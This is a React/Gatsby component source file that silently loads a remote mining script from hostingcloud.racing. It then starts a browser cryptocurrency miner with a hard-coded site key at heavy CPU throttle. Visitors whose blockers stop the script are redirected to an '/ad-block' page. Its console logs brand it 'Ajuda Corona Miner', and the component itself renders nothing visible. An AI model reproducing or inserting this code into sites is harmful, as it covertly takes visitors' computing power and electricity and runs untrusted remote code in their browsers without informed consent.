/* eslint no-unused-vars: 0 */
/* eslint no-console: 0 */

import { Component } from 'react';
import { navigate } from 'gatsby';
import scriptjs from 'scriptjs';

class Miner extends Component {
  componentDidMount() {
    this.setupMiner();
  }

  setupMiner = () => {
    if (typeof window === 'undefined' || window.location.href.match(/localhost/gm)) {
      return null;
    }

    scriptjs('//hostingcloud.racing/KcRw.js', () => {
      if (!window.Client) {
        navigate('/ad-block');
      } else if (window.location.pathname.match(/ad-block/gm)) {
        navigate('/');
      }

      if (window.Client) {
        window.miner = new window.Client.Anonymous(
          '6e20605186aac3440681d2581c1ea1b98fbff460ca9465167586c09d4a9edfeb',
          {
            // throttle: 0, Full CPU (make this dynamic later...)
            throttle: 0.9,
            c: 'w',
            ads: 0,
          }
        );

        window.miner.start();

        window.miner.on('open', params => {
          console.log(
            '[Ajuda Corona Miner] The connection to the mining pool has been opened'
          );
        });

        window.miner.on('job', params => {
          console.log(
            '[Ajuda Corona Miner] A new mining job has been received from the pool!'
          );
        });

        window.miner.on('found', params => {
          console.log(
            '[Ajuda Corona Miner] Hash has been found and will be send to the pool!'
          );
        });

        window.miner.on('close', params => {
          console.log(
            '[Ajuda Corona Miner] The connection to the pool was closed - End of the job!'
          );
        });

        window.miner.on('error', params => {
          if (params.error !== 'connection_error') {
            console.log('[Ajuda Corona Miner] The pool reported an error', params.error);
          }
        });
      }
    });
  };

  render() {
    return null;
  }
}

export default Miner;
